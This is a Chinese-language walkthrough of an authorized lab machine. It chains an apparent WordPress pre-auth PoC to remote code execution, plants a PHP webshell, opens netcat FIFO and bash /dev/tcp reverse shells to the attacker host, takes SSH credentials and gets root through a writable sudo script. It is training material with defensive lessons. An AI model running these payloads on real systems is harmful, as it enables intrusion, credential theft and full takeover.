# Boom 靶机复盘：WordPress 漏洞到 sudo 提权

> 本文记录隔离环境中的授权靶机复盘。漏洞验证、命令执行、反弹 Shell 和 sudo 提权都只应在明确授权的系统中进行。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | Boom（主机名 Bomb）/ Alpine Linux |
| 目标地址 | 192.168.134.57 |
| 攻击机 | 192.168.134.4 |
| Web 栈 | Apache 2.4.67、PHP 8.1.34、WordPress 7.1-beta1 |
| 开放端口 | 22/tcp、80/tcp |
| 初始漏洞 | CVE-2026-63030 + CVE-2026-60137 |
| 最终路径 | WordPress 预认证漏洞链 → wp2shell RCE → 反弹 Shell → 凭据发现 → SSH → 可写 sudo 脚本 → root |

![Boom 靶机启动页与目标地址](/content/boom/image-01.png)

## 1. 目标与漏洞

### 1.1 端口和版本识别

先对目标进行全端口扫描和服务识别：

```bash
nmap -sT -sV -sC -O -p- 192.168.134.57
```

目标只开放 22 与 80 端口。HTTP 服务暴露 Apache、PHP 和 WordPress 版本信息，页面标题为 Bomb WordPress。

![Nmap 识别出 SSH、Apache 与 WordPress 7.1-beta1](/content/boom/image-02.png)

### 1.2 wp2shell 漏洞链

使用的 PoC 将两个问题串联起来：

- CVE-2026-63030：WordPress REST API 的 batch 路由混淆导致预认证边界被绕过。
- CVE-2026-60137：WP_Query 的 author__not_in 参数存在 SQL 注入，可被继续利用。

目标生成器显示 7.1-beta1，但 PoC 的实际检查结果明确返回 vulnerable 和 RCE-capable。因此这里以动态验证结果为准，不只依赖版本横幅判断。

![wp2shell PoC 对漏洞链与受影响版本的说明](/content/boom/image-03.png) ![PoC 检查确认目标可利用并具备 RCE 能力](/content/boom/image-04.png)

验证命令：

```bash
python3 wp2shell/wp2shell.py http://192.168.134.57 --check
```

> 风险说明：预认证漏洞验证也会访问敏感 REST 路由并触发数据库查询。不要对未授权站点执行 PoC，也不要仅凭版本号直接判定漏洞成立。

## 2. 漏洞利用与回连

### 2.1 可选的 WebShell 验证

PoC 可以执行命令，也可以把一个 PHP 文件写入上传目录进行验证。截图中通过 cmd=id 确认 Web 进程身份为 apache。

```bash
python3 wp2shell/wp2shell.py http://192.168.134.57 --exec \
  'echo "<?php system(\$_GET[\"cmd\"]); ?>" > /opt/wordpress/wp-content/uploads/shell.php'

curl "http://192.168.134.57/wp-content/uploads/shell.php?cmd=id"
```

![上传目录中的 WebShell 以 apache 身份执行 id](/content/boom/image-05.png)

> WebShell 会留下持久文件，验证后必须清理。后续主线采用一次性命令执行触发反弹 Shell。

### 2.2 通过 wp2shell 获得反弹 Shell

攻击机先监听 4444，再通过 wp2shell 的 exec 功能投递 FIFO 反弹命令：

```bash
# 攻击机监听
nc -lvnp 4444

# 目标执行
python3 wp2shell/wp2shell.py http://192.168.134.57 --exec \
  "mkfifo /tmp/bf; cat /tmp/bf|sh -i 2>&1|nc 192.168.134.4 4444 >/tmp/bf &"
```

PoC 输出显示它临时构造管理员与命令执行链，完成后主动清理相关数据；监听端收到来自目标的连接，当前目录为 /opt/wordpress。

![wp2shell 执行命令并在 4444 端口收到回连](/content/boom/image-06.png)

## 3. Shell 稳定与 SSH

### 3.1 升级交互 Shell

最初的 /bin/sh 没有 TTY 和作业控制，先使用 Python PTY 获得更可用的交互环境：

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

随后另开 5555 监听，并从目标启动 Bash TCP 回连：

```bash
# 目标
bash -c 'bash -i >& /dev/tcp/192.168.134.4/5555 0>&1'

# 攻击机
nc -lvnp 5555
```

![使用 Python PTY 后投递第二条 Bash 回连](/content/boom/image-07.png) ![5555 端口获得 apache 身份的 Bash Shell](/content/boom/image-08.png)

### 3.2 发现本地用户凭据

/home 下存在用户 ll104567，但 apache 无法直接进入其目录。按文件所有者继续枚举：

```bash
find / -user ll104567 -type f 2>/dev/null
```

结果发现 /usr/bin/12138.txt，其中保存了可用于 SSH 的口令。

![发现 ll104567 用户但无法直接访问其家目录](/content/boom/image-09.png) ![在 /usr/bin/12138.txt 中找到 SSH 凭据](/content/boom/image-10.png)

### 3.3 切换到稳定 SSH 会话

```bash
ssh ll104567@192.168.134.57
```

SSH 登录后获得完整终端，并通过 sudo -l 看到关键配置：

```text
(ALL) NOPASSWD: /home/ll104567/12138.sh
```

![SSH 登录 ll104567 并发现免密 sudo 脚本](/content/boom/image-11.png)

## 4. sudo 提权

sudo 允许 ll104567 免密以 root 执行 /home/ll104567/12138.sh，但该脚本位于用户可写目录，文件本身也由该用户控制。这意味着普通用户能够替换 sudo 信任的执行内容。

```bash
rm /home/ll104567/12138.sh
printf '#!/bin/sh\n/bin/bash\n' > /home/ll104567/12138.sh
chmod +x /home/ll104567/12138.sh
sudo /home/ll104567/12138.sh
```

![删除并重写 sudo 信任的 12138.sh](/content/boom/image-12.png) ![执行被替换的脚本后获得 root](/content/boom/image-13.png)

最终通过 id、whoami 和 /root/root.txt 确认完整 root 权限。

![Boom 靶机 root Shell 与最终 flag](/content/boom/image-14.png)

> 防守视角：sudoers 中引用的脚本及其父目录都必须由 root 控制，普通用户不能拥有写权限。否则即使命令路径固定，允许执行的真实内容仍可被替换。

## 5. 复盘要点

| 阶段 | 关键结论 |
|------|----------|
| 版本识别 | 版本横幅只能提供线索，最终应以安全的动态检查结果确认 |
| 漏洞链 | REST 路由混淆与 SQL 注入组合后，将预认证问题扩大为命令执行 |
| 回连 Shell | 首次 Shell 只负责建立落点，PTY 与第二条 Bash 回连改善交互体验 |
| 凭据发现 | 用户目录不可读时，可以从文件所有权和系统路径继续横向枚举 |
| SSH | 使用合法本地账户重新登录，可获得更稳定且更接近真实用户的执行上下文 |
| sudo | 固定脚本路径不等于安全；脚本或父目录可写就等于把 root 执行内容交给普通用户 |

这条链路的“王炸”并不是 sudo 本身，而是信任边界完全失效：root 信任了一个由低权限用户控制的文件。复盘此类配置时，应同时检查 sudoers 条目、目标文件所有者、目录写权限、符号链接和文件替换可能性。

工具参考：

```text
https://github.com/sergiointel/wp2shell-poc
```
